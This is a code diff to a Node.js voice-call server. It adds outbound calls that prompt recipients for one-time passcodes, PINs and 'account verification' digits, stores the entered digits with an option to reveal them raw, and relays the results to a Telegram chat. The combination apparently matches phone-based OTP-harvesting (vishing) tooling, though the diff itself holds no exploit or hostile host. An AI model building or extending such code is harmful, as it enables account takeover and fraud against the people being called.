@@ -91,6 +91,343 @@ const DTMF_FLUSH_DELAY_MS = 1500;
 let awsAdapters = null;
 let vonageAdapters = null;
 
+const COLLECT_INPUT_FUNCTIONS = new Set(['ivr_survey', 'pin_entry', 'menu_selection', 'otp_collection', 'account_verification']);
+const collectInputCompletion = new Set();
+
+function sanitizeDigits(rawInput) {
+  if (rawInput == null) {
+    return '';
+  }
+  return String(rawInput).replace(/[^0-9*#]/g, '');
+}
+
+async function persistDtmfCapture(callSid, digits, options = {}) {
+  if (!callSid || !db) {
+    return;
+  }
+
+  const sanitizedDigits = sanitizeDigits(digits);
+  if (!sanitizedDigits) {
+    return;
+  }
+
+  const {
+    source = currentProvider,
+    provider = currentProvider,
+    stage_key: stageKeyOverride = null,
+    stage_label: stageLabelOverride = null,
+    metadata: metadataOverride = {},
+    finished = undefined,
+    reason = undefined,
+    capture_method: captureMethod = 'stream',
+    skipCallInputInsert = false,
+    callInputStep: providedCallInputStep = null,
+  } = options;
+
+  try {
+    const callRecord = await db.getCall(callSid);
+    if (!callRecord) {
+      console.warn(`⚠️ DTMF capture skipped; missing call record for ${callSid}`);
+      return;
+    }
+
+    const callMetadata = parseMetadataJson(callRecord.metadata_json) || {};
+    const inputSequence = Array.isArray(callMetadata.input_sequence) ? callMetadata.input_sequence : [];
+
+    let callInputStep = typeof providedCallInputStep === 'number' ? providedCallInputStep : null;
+    if (callRecord.call_type === 'collect_input' && !skipCallInputInsert) {
+      callInputStep = await db.getNextCallInputStep(callSid);
+      await db.saveCallInput({
+        call_sid: callSid,
+        step: callInputStep,
+        input_type: 'digit',
+        value: sanitizedDigits,
+      });
+    }
+
+    const metadataEnvelope =
+      metadataOverride && typeof metadataOverride === 'object' && !Array.isArray(metadataOverride)
+        ? { ...metadataOverride }
+        : {};
+
+    if (callInputStep) {
+      metadataEnvelope.call_input_step = callInputStep;
+    }
+
+    let stageKey = stageKeyOverride ? dtmfUtils.normalizeStage(stageKeyOverride) : null;
+    let stageLabel = stageLabelOverride || null;
+
+    if (!stageKey && metadataEnvelope.stage_key) {
+      stageKey = dtmfUtils.normalizeStage(metadataEnvelope.stage_key);
+    }
+
+    if (callRecord.call_type === 'collect_input') {
+      const stepIndex = callInputStep && inputSequence.length ? callInputStep - 1 : 0;
+      const stageConfig =
+        (typeof stepIndex === 'number' && inputSequence[stepIndex]) || inputSequence[inputSequence.length - 1];
+      if (stageConfig) {
+        if (!stageKey && stageConfig.stage) {
+          stageKey = dtmfUtils.normalizeStage(stageConfig.stage);
+        } else if (!stageKey && stageConfig.label) {
+          stageKey = dtmfUtils.normalizeStage(stageConfig.label);
+        }
+        if (!stageLabel && stageConfig.label) {
+          stageLabel = stageConfig.label;
+        }
+      }
+    }
+
+    if (!stageKey) {
+      stageKey = 'GENERIC';
+    }
+    const stageDefinition = dtmfUtils.getStageDefinition(stageKey);
+    const resolvedStageLabel = stageLabel || stageDefinition.label;
+
+    const normalizedMetadata = {
+      ...metadataEnvelope,
+      source,
+      provider,
+      capture_method: captureMethod,
+      stage_label: resolvedStageLabel,
+    };
+
+    if (typeof finished === 'boolean') {
+      normalizedMetadata.finished = finished;
+    }
+    if (reason) {
+      normalizedMetadata.reason = reason;
+    }
+
+    Object.keys(normalizedMetadata).forEach((key) => {
+      if (normalizedMetadata[key] === undefined || normalizedMetadata[key] === null) {
+        delete normalizedMetadata[key];
+      }
+    });
+
+    const compliancePayload = dtmfUtils.savePayloadForCompliance(stageKey, sanitizedDigits, provider, normalizedMetadata);
+
+    await db.saveDtmfEntry({
+      call_sid: callSid,
+      stage_key: compliancePayload.metadata.stage_key,
+      masked_digits: compliancePayload.maskedDigits,
+      encrypted_digits: compliancePayload.encryptedDigits,
+      compliance_mode: complianceConfig?.mode || 'safe',
+      provider,
+      metadata: compliancePayload.metadata,
+    });
+
+    await db.updateCallState(callSid, 'dtmf_captured', {
+      stage_key: compliancePayload.metadata.stage_key,
+      masked_digits: compliancePayload.maskedDigits,
+      digits_preview: dtmfUtils.shouldRevealRawDigits() ? sanitizedDigits : compliancePayload.maskedDigits,
+      provider,
+      metadata: normalizedMetadata,
+    });
+
+    const targetChatId = callRecord.telegram_chat_id || callRecord.user_chat_id;
+    if (callRecord.call_type !== 'collect_input' && targetChatId) {
+      await db.createEnhancedWebhookNotification(callSid, 'call_input_dtmf', targetChatId, 'high');
+    }
+
+    await db.logServiceHealth('call_system', 'dtmf_captured', {
+      call_sid: callSid,
+      digits_length: sanitizedDigits.length,
+      stage_key: compliancePayload.metadata.stage_key,
+      source,
+    });
+
+    const digitsPreview = dtmfUtils.shouldRevealRawDigits() ? sanitizedDigits : compliancePayload.maskedDigits;
+    console.log(`🔢 Captured DTMF input for ${callSid}: ${digitsPreview}`.cyan);
+  } catch (error) {
+    console.error('❌ Failed to persist DTMF input:', error);
+  }
+}
+
+function extractDigitsFromPayload(candidate) {
+  if (candidate == null) {
+    return '';
+  }
+  if (typeof candidate === 'string' || typeof candidate === 'number') {
+    return String(candidate);
+  }
+  if (typeof candidate === 'object') {
+    if (typeof candidate.digits === 'string') {
+      return candidate.digits;
+    }
+    if (typeof candidate.Digits === 'string') {
+      return candidate.Digits;
+    }
+    if (typeof candidate.value === 'string') {
+      return candidate.value;
+    }
+  }
+  return '';
+}
+
+function toBoolean(value) {
+  if (typeof value === 'boolean') return value;
+  if (typeof value === 'string') {
+    const normalized = value.trim().toLowerCase();
+    return ['true', '1', 'yes', 'y'].includes(normalized);
+  }
+  return false;
+}
+
+function getDefaultInputSequence(numDigits = 4) {
+  return [
+    {
+      stage: 'ENTRY',
+      label: 'Entry',
+      prompt: 'Please enter the requested digits followed by the pound key.',
+      numDigits: Number(numDigits) || null,
+      timeout: 5
+    }
+  ];
+}
+
+function normalizeInputSequencePayload(rawSequence, fallbackDigits = 4) {
+  if (!Array.isArray(rawSequence) || rawSequence.length === 0) {
+    return getDefaultInputSequence(fallbackDigits);
+  }
+
+  return rawSequence.map((step, index) => {
+    const normalizedStage = (step?.stage || `STEP_${index + 1}`).toString().toUpperCase();
+    return {
+      stage: normalizedStage,
+      label: step?.label || normalizedStage,
+      prompt: step?.prompt || `Please provide input for ${normalizedStage}.`,
+      numDigits: step?.numDigits ? Number(step.numDigits) : null,
+      timeout: step?.timeout ? Number(step.timeout) : 5,
+      thankYou: step?.thankYou || null
+    };
+  });
+}
+
+function parseMetadataJson(value) {
+  if (!value) return null;
+  if (typeof value === 'object') return value;
+  try {
+    return JSON.parse(value);
+  } catch (error) {
+    console.warn('Failed to parse metadata_json:', error.message);
+    return null;
+  }
+}
+
+async function handleCollectInputRequest(req, res, callRecord) {
+  const callSid = req.body?.CallSid || req.query?.CallSid;
+  if (!callSid) {
+    res.status(400).send('Missing CallSid');
+    return;
+  }
+
+  const callConfig = callConfigurations.get(callSid) || {};
+  const metadata = parseMetadataJson(callRecord?.metadata_json) || {};
+  const sequenceFromConfig = Array.isArray(callConfig.collect_input_sequence) ? callConfig.collect_input_sequence : null;
+  const sequenceFromMetadata = Array.isArray(metadata.input_sequence) ? metadata.input_sequence : null;
+  const inputSequence = (sequenceFromConfig && sequenceFromConfig.length)
+    ? sequenceFromConfig
+    : (sequenceFromMetadata && sequenceFromMetadata.length)
+      ? sequenceFromMetadata
+      : getDefaultInputSequence(callConfig.collect_digits || 4);
+
+  const thankYouMessage = callConfig.collectThankYouMessage
+    || 'Thank you for verifying your information. Your data has been securely recorded. Have a great day.';
+
+  const digits = req.body?.Digits;
+  const speechResult = req.body?.SpeechResult;
+  const confidence = req.body?.Confidence ? Number(req.body.Confidence) : null;
+  const stageParam = parseInt(req.query?.gather_stage || req.body?.GatherStage || '0', 10);
+
+  if (digits || speechResult) {
+    const pendingStep = !Number.isNaN(stageParam) && stageParam > 0
+      ? stageParam
+      : await db.getNextCallInputStep(callSid);
+    const normalizedValue = digits ? String(digits) : String(speechResult);
+    const inputType = digits ? 'digit' : 'speech';
+
+    await db.saveCallInput({
+      call_sid: callSid,
+      step: pendingStep,
+      input_type: inputType,
+      value: normalizedValue,
+      confidence: digits ? null : confidence
+    });
+
+    if (digits) {
+      const stageConfig = inputSequence[pendingStep - 1] || inputSequence[inputSequence.length - 1];
+      const stageKey = stageConfig?.stage || `STEP_${pendingStep}`;
+      await persistDtmfCapture(callSid, digits, {
+        source: 'twilio',
+        provider: 'twilio',
+        stage_key: stageKey,
+        stage_label: stageConfig?.label,
+        callInputStep: pendingStep,
+        skipCallInputInsert: true,
+        capture_method: 'twilio_gather',
+        metadata: {
+          stage_label: stageConfig?.label,
+          gather_stage: pendingStep,
+          sequence_length: inputSequence.length,
+        },
+      });
+    }
+  }
+
+  const collectedInputs = await db.getCallInputs(callSid);
+  if (collectedInputs.length >= inputSequence.length) {
+    const response = new VoiceResponse();
+    response.say(thankYouMessage);
+    response.hangup();
+    res.type('text/xml').send(response.toString());
+    await finalizeCollectInputCall(callSid, callRecord);
+    callConfigurations.delete(callSid);
+    return;
+  }
+
+  const nextStepIndex = collectedInputs.length;
+  const stepConfig = inputSequence[nextStepIndex] || inputSequence[inputSequence.length - 1];
+  const response = new VoiceResponse();
+  const gatherOptions = {
+    input: 'dtmf speech',
+    action: `${publicHttpBase}/incoming?CallSid=${encodeURIComponent(callSid)}&gather_stage=${nextStepIndex + 1}`,
+    method: 'POST',
+    timeout: stepConfig.timeout || 5
+  };
+  if (stepConfig.numDigits) {
+    gatherOptions.numDigits = Number(stepConfig.numDigits);
+  }
+  const gather = response.gather(gatherOptions);
+  gather.say(stepConfig.prompt || 'Please provide your input now.');
+  response.say('No input received, let\'s try again.');
+  response.redirect(`${publicHttpBase}/incoming?CallSid=${encodeURIComponent(callSid)}`);
+  res.type('text/xml').send(response.toString());
+}
+
+async function finalizeCollectInputCall(callSid, callDetails) {
+  if (!callSid || collectInputCompletion.has(callSid)) {
+    return;
+  }
+  collectInputCompletion.add(callSid);
+  try {
+    const details = callDetails || await db.getCall(callSid);
+    const targetChatId = details?.telegram_chat_id || details?.user_chat_id;
+    await db.updateCallStatus(callSid, 'completed', {
+      ended_at: new Date().toISOString()
+    });
+
+    if (targetChatId) {
+      await db.createEnhancedWebhookNotification(callSid, 'call_input_summary', targetChatId, 'high');
+    }
+    if (callConfigurations.has(callSid)) {
+      callConfigurations.delete(callSid);
+    }
+    setTimeout(() => collectInputCompletion.delete(callSid), 60 * 60 * 1000);
+  } catch (error) {
+    console.error('Failed to finalize collect-input call:', error);
+  }
+}
+
 function parseDtmfMetadata(metadata) {
   if (!metadata) {
     return {};
@@ -555,103 +892,42 @@ app.ws('/connection', (ws) => {
         return;
       }
 
-      const sanitizedDigits = String(digits || '').replace(/[^0-9*#]/g, '');
-      if (!sanitizedDigits) {
-        return;
+      const dtmfDetails = extraMeta?.dtmf || {};
+      const stageCandidate =
+        extraMeta.stage_key ||
+        extraMeta.stage ||
+        dtmfDetails.stage_key ||
+        dtmfDetails.stage ||
+        dtmfDetails.prompt_key ||
+        null;
+
+      const metadataEnvelope = {};
+      if (dtmfDetails?.timestamp) {
+        metadataEnvelope.provider_timestamp = dtmfDetails.timestamp;
+      }
+      if (typeof dtmfDetails?.confidence === 'number') {
+        metadataEnvelope.confidence = dtmfDetails.confidence;
+      }
+      if (dtmfDetails?.type) {
+        metadataEnvelope.provider_type = dtmfDetails.type;
+      }
+      if (extraMeta?.metadata && typeof extraMeta.metadata === 'object') {
+        metadataEnvelope.provider_metadata = extraMeta.metadata;
+      }
+      if (extraMeta?.captured_at) {
+        metadataEnvelope.captured_at = extraMeta.captured_at;
       }
 
-      try {
-        const dtmfDetails = extraMeta?.dtmf || {};
-        const stageCandidate =
-          extraMeta.stage_key ||
-          extraMeta.stage ||
-          dtmfDetails.stage_key ||
-          dtmfDetails.stage ||
-          dtmfDetails.prompt_key ||
-          null;
-        const stageKey = dtmfUtils.normalizeStage(stageCandidate || 'generic');
-        const stageDefinition = dtmfUtils.getStageDefinition(stageKey);
-
-        const metadataEnvelope = {
-          source,
-          provider: currentProvider,
-          finished: typeof extraMeta.finished === 'boolean' ? extraMeta.finished : undefined,
-          reason: extraMeta.reason,
-          captured_at: extraMeta.captured_at || new Date().toISOString(),
-          stage_label: stageDefinition.label,
-        };
-
-        if (dtmfDetails?.timestamp) {
-          metadataEnvelope.provider_timestamp = dtmfDetails.timestamp;
-        }
-        if (typeof dtmfDetails?.confidence === 'number') {
-          metadataEnvelope.confidence = dtmfDetails.confidence;
-        }
-        if (dtmfDetails?.type) {
-          metadataEnvelope.provider_type = dtmfDetails.type;
-        }
-        if (extraMeta?.metadata && typeof extraMeta.metadata === 'object') {
-          metadataEnvelope.provider_metadata = extraMeta.metadata;
-        }
-
-        Object.keys(metadataEnvelope).forEach((key) => {
-          if (metadataEnvelope[key] === undefined || metadataEnvelope[key] === null) {
-            delete metadataEnvelope[key];
-          }
-        });
-
-        const compliancePayload = dtmfUtils.savePayloadForCompliance(
-          stageKey,
-          sanitizedDigits,
-          currentProvider,
-          metadataEnvelope
-        );
-        const complianceMode = complianceConfig?.mode || 'safe';
-
-        await db.saveDtmfEntry({
-          call_sid: callSid,
-          stage_key: compliancePayload.metadata.stage_key,
-          masked_digits: compliancePayload.maskedDigits,
-          encrypted_digits: compliancePayload.encryptedDigits,
-          compliance_mode: complianceMode,
-          provider: currentProvider,
-          metadata: compliancePayload.metadata
-        });
-
-        await db.updateCallState(callSid, 'dtmf_captured', {
-          stage_key: compliancePayload.metadata.stage_key,
-          masked_digits: compliancePayload.maskedDigits,
-          digits_preview: dtmfUtils.shouldRevealRawDigits()
-            ? sanitizedDigits
-            : compliancePayload.maskedDigits,
-          provider: currentProvider,
-          metadata: compliancePayload.metadata
-        });
-
-        const callRecord = await db.getCall(callSid);
-        if (callRecord?.user_chat_id) {
-          await db.createEnhancedWebhookNotification(
-            callSid,
-            'call_input_dtmf',
-            callRecord.user_chat_id,
-            'high'
-          );
-        }
-
-        await db.logServiceHealth('call_system', 'dtmf_captured', {
-          call_sid: callSid,
-          digits_length: sanitizedDigits.length,
-          stage_key: compliancePayload.metadata.stage_key,
-          source
-        });
-
-        const logDigits = dtmfUtils.shouldRevealRawDigits()
-          ? sanitizedDigits
-          : compliancePayload.maskedDigits;
-        console.log(`🔢 Captured DTMF input for ${callSid}: ${logDigits}`.cyan);
-      } catch (error) {
-        console.error('❌ Failed to persist DTMF input:', error);
-      }
+      await persistDtmfCapture(callSid, digits, {
+        source,
+        provider: currentProvider,
+        stage_key: stageCandidate,
+        stage_label: extraMeta.stage_label,
+        metadata: metadataEnvelope,
+        finished: extraMeta.finished === true,
+        reason: extraMeta.reason,
+        capture_method: 'twilio_stream',
+      });
     };
 
     ws.on('message', async function message(data) {
@@ -1028,6 +1304,10 @@ async function handleCallEnd(callSid, callStartTime) {
     const duration = Math.round((callEndTime - callStartTime) / 1000);
 
     const callDetails = await db.getCall(callSid);
+    if (callDetails?.call_type === 'collect_input') {
+      await finalizeCollectInputCall(callSid, callDetails);
+      return;
+    }
     const transcripts = await db.getCallTranscripts(callSid);
     const dtmfEntries = await db.getCallDtmfEntries(callSid);
 
@@ -1075,17 +1355,14 @@ async function handleCallEnd(callSid, callStartTime) {
     });
 
     // Create enhanced webhook notification for completion
-    if (callDetails && callDetails.user_chat_id) {
-      await db.createEnhancedWebhookNotification(callSid, 'call_completed', callDetails.user_chat_id);
-
-      if (dtmfEntries.length > 0) {
-        await db.createEnhancedWebhookNotification(callSid, 'call_dtmf_summary', callDetails.user_chat_id, 'high');
-      }
+    const targetChatId = callDetails?.telegram_chat_id || callDetails?.user_chat_id;
+    if (callDetails && targetChatId) {
+      await db.createEnhancedWebhookNotification(callSid, 'call_completed', targetChatId);
 
       // Schedule transcript notification with delay
       setTimeout(async () => {
         try {
-          await db.createEnhancedWebhookNotification(callSid, 'call_transcript', callDetails.user_chat_id);
+          await db.createEnhancedWebhookNotification(callSid, 'call_transcript', targetChatId);
         } catch (transcriptError) {
           console.error('Error creating transcript notification:', transcriptError);
         }
@@ -1148,12 +1425,27 @@ function generateCallSummary(transcripts, duration) {
 }
 
 // Incoming endpoint used by Twilio to connect the call to our websocket stream
-app.post('/incoming', (req, res) => {
+app.post('/incoming', async (req, res) => {
   if (currentProvider !== 'twilio') {
     res.status(404).json({ error: 'Incoming calls are handled by the active provider' });
     return;
   }
   try {
+    const callSid = req.body?.CallSid || req.query?.CallSid;
+    let callRecord = null;
+    if (callSid) {
+      try {
+        callRecord = await db.getCall(callSid);
+      } catch (error) {
+        console.warn('Unable to load call record for incoming request:', error.message);
+      }
+    }
+
+    if (callRecord?.call_type === 'collect_input') {
+      await handleCollectInputRequest(req, res, callRecord);
+      return;
+    }
+
     const response = new VoiceResponse();
     const connect = response.connect();
     connect.stream({ url: `${publicWsBase}/connection` });
@@ -1175,13 +1467,21 @@ app.post('/outbound-call', async (req, res) => {
       first_message,
       user_chat_id,
       business_id,
+      business_function: businessFunctionRaw,
+      call_type: requestedCallType,
+      requires_input,
       purpose,
       channel: rawChannel,
       emotion,
       urgency,
       technical_level: technicalLevel,
       voice_model,
-      template
+      template,
+      telegram_chat_id: requestedTelegramChatId,
+      metadata_json,
+      input_sequence,
+      collect_digits,
+      collect_thank_you_message
     } = req.body;
 
     if (!number) {
@@ -1243,6 +1543,14 @@ app.post('/outbound-call', async (req, res) => {
     }
 
     const resolvedBusinessId = businessProfile ? businessProfile.id : (business_id || 'general');
+    const businessFunction = businessFunctionRaw ? businessFunctionRaw.toString().trim().toLowerCase() : null;
+    let callType = (requestedCallType || '').toString().trim().toLowerCase();
+    const requiresInputFlag = toBoolean(requires_input);
+    if (!['collect_input', 'service'].includes(callType)) {
+      callType = (requiresInputFlag || (businessFunction && COLLECT_INPUT_FUNCTIONS.has(businessFunction)))
+        ? 'collect_input'
+        : 'service';
+    }
 
     const normalizeKey = (value, fallback) =>
       (value || fallback || '')
@@ -1322,6 +1630,15 @@ app.post('/outbound-call', async (req, res) => {
           : 'custom';
 
     const effectiveVoiceModel = voice_model || deepgramConfig.voiceModel;
+    const sanitizedInputSequence = callType === 'collect_input'
+      ? normalizeInputSequencePayload(input_sequence, collect_digits || 4)
+      : [];
+    const metadataPayload = parseMetadataJson(metadata_json) || {};
+    if (callType === 'collect_input') {
+      metadataPayload.input_sequence = sanitizedInputSequence;
+    }
+    const metadataSerialized = Object.keys(metadataPayload).length ? JSON.stringify(metadataPayload) : null;
+    const resolvedTelegramChatId = requestedTelegramChatId || user_chat_id || null;
 
     const callConfig = {
       prompt: selectedPrompt,
@@ -1337,7 +1654,14 @@ app.post('/outbound-call', async (req, res) => {
       prompt_source: promptSource,
       persona_metadata: composition ? composition.metadata : null,
       voice_model: effectiveVoiceModel,
-      template_name: templateName
+      template_name: templateName,
+      call_type: callType,
+      business_function: businessFunction,
+      collect_input_sequence: sanitizedInputSequence,
+      collect_digits: collect_digits || 4,
+      collectThankYouMessage: collect_thank_you_message,
+      telegram_chat_id: resolvedTelegramChatId,
+      metadata_json: metadataSerialized
     };
 
     let callSid = null;
@@ -1452,7 +1776,11 @@ app.post('/outbound-call', async (req, res) => {
           promptSource,
           voice_model: effectiveVoiceModel || null,
           template_name: templateName || null
-        }
+        },
+        call_type: callType,
+        business_function: businessFunction,
+        telegram_chat_id: resolvedTelegramChatId,
+        metadata_json: metadataSerialized
       });
 
       if (user_chat_id) {
@@ -1612,6 +1940,27 @@ app.post('/vonage/event', async (req, res) => {
       console.warn('Vonage event received for unknown call', event);
       res.json({ received: true, ignored: true });
       return;
+    }
+
+    const vonageDigitsCandidate =
+      extractDigitsFromPayload(event.dtmf) ||
+      extractDigitsFromPayload(event.dtmf_digits) ||
+      extractDigitsFromPayload(event.dtmfDigits) ||
+      extractDigitsFromPayload(event.digits) ||
+      extractDigitsFromPayload(event.payload?.dtmf) ||
+      extractDigitsFromPayload(event.payload?.digits);
+
+    if (vonageDigitsCandidate) {
+      await persistDtmfCapture(callSid, vonageDigitsCandidate, {
+        source: 'vonage',
+        provider: 'vonage',
+        capture_method: 'vonage_event',
+        metadata: {
+          event_status: status,
+          uuid,
+          conversation_uuid: conversationUuid,
+        },
+      });
     }
 
     const normalizedStatusRaw = (status || '').toLowerCase();
@@ -1819,9 +2168,14 @@ app.post('/webhook/call-status', async (req, res) => {
     await db.updateCallStatus(CallSid, actualStatus, updateData);
 
     // Create enhanced webhook notification with corrected status
-    if (call.user_chat_id && notificationType) {
+    if (call.call_type === 'collect_input' && ['completed', 'no-answer', 'failed', 'canceled'].includes(actualStatus)) {
+      await finalizeCollectInputCall(CallSid, call);
+    }
+
+    if ((call.telegram_chat_id || call.user_chat_id) && notificationType) {
       try {
-        await db.createEnhancedWebhookNotification(CallSid, notificationType, call.user_chat_id);
+        const targetChat = call.telegram_chat_id || call.user_chat_id;
+        await db.createEnhancedWebhookNotification(CallSid, notificationType, targetChat);
         console.log(`📨 Created corrected ${notificationType} notification for call ${CallSid}`.green);
         
         // Log the correction if we changed the status
@@ -1893,6 +2247,7 @@ app.get('/api/calls/:callSid', async (req, res) => {
     const transcripts = await db.getCallTranscripts(callSid);
     const dtmfEntries = await db.getCallDtmfEntries(callSid);
     const dtmfInputs = formatDtmfEntriesForResponse(dtmfEntries);
+    const callInputs = await db.getCallInputs(callSid);
 
     let businessContext = null;
     if (call.business_context) {
@@ -1930,7 +2285,12 @@ app.get('/api/calls/:callSid', async (req, res) => {
       call,
       transcripts,
       dtmf_inputs: dtmfInputs,
+      inputs: callInputs,
       transcript_count: transcripts.length,
+      transcript_preview: transcripts
+        .map((entry) => entry.clean_message || entry.message || entry.raw_message || '')
+        .join('\n')
+        .slice(0, 500),
       adaptation_analytics: adaptationData,
       business_context: businessContext,
       webhook_notifications: webhookNotifications,
@@ -2859,6 +3219,28 @@ app.post('/aws/contact-events', async (req, res) => {
       await db.updateCallState(resolvedCallSid, 'connect_event', {
         event_type: eventType,
         payload: JSON.stringify(payload)
+      });
+    }
+
+    const awsDigitsCandidate =
+      extractDigitsFromPayload(payload.dtmfDigits) ||
+      extractDigitsFromPayload(payload.dtmf) ||
+      extractDigitsFromPayload(payload.customerInput) ||
+      extractDigitsFromPayload(payload.detail?.dtmfDigits) ||
+      extractDigitsFromPayload(payload.detail?.customerInput) ||
+      extractDigitsFromPayload(payload.detail?.customer_input) ||
+      extractDigitsFromPayload(payload.detail?.dtmf) ||
+      extractDigitsFromPayload(payload.detail?.input);
+
+    if (resolvedCallSid && awsDigitsCandidate) {
+      await persistDtmfCapture(resolvedCallSid, awsDigitsCandidate, {
+        source: 'aws',
+        provider: 'aws',
+        capture_method: 'aws_event',
+        metadata: {
+          contact_id: contactId,
+          event_type: eventType,
+        },
       });
     }
 
